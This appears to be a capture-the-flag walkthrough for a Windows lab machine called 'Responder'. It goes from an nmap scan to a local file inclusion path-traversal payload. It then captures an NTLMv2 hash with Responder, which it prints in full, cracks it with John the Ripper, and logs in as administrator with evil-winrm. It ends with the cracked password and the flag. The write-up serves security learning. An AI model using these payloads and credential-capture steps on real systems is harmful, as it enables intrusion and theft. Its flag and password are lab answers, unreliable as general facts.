# Responder

IP = `10.129.92.0`

### nmap 

```bash
nmap -O -sV 10.129.92.0

```
Result
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
```

NOTE: use -p- flag because at the ending of the hack I had to use nmap command again to get a service runing on port 5985 `Microsoft HTTPAPI httpd 2.6 (SSDP/UPnP)`

So the server is running windows os, When you will try to open it, It will redirect you to `unika.htb` and its not opening, after googling I found that it was using some name-based virtual hosting, and we have to have add `10.129.92.0` and name `unika.htb` in /etc/hosts file.

After Adding it website opens and observe the url when you will explore the webite, when you click on En, and change the language it will serve `/page=german.html`.

Yes, here we have exploit local file inclusion attack, The most command file in windows server attacker try to gain access is `/windows/system32/drivers/etc/hosts`

So, let goooo
```
http://unika.htb/index.php?page=../../../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts
```

Output
```
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
```

Let's use responder to exploit this and get hash

```bash
responder -I tun0
```

```
[SMB] NTLMv2-SSP Client   : 10.129.92.0
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:8cc7e20d17698e3e:FC9468D5F15083A6B48082D7A3047904:01010000000000008067E9081DF1D90153A8DB4A0615369C0000000002000800300030005500430001001E00570049004E002D0043005A00380033005100530047005A004A003300550004003400570049004E002D0043005A00380033005100530047005A004A00330055002E0030003000550043002E004C004F00430041004C000300140030003000550043002E004C004F00430041004C000500140030003000550043002E004C004F00430041004C00070008008067E9081DF1D90106000400020000000800300030000000000000000100000000200000F30CA6E6B47266A178E0B7FB07B878C22C1F4A763553A63CD28F1531A16DAF070A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350039000000000000000000 
```

let's crack the hash with john the ripper
```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

ouput
```
badminton        (Administrator)     
```

now login with evil-winrm 
```bash
evil-winrm -i 10.129.92.0 -u administrator -p badminton 
```
and voila you are in. Now explore bit and navigate to users folder and see what users have.

flag `ea81b7afddd03efaa0945333ed147fac`

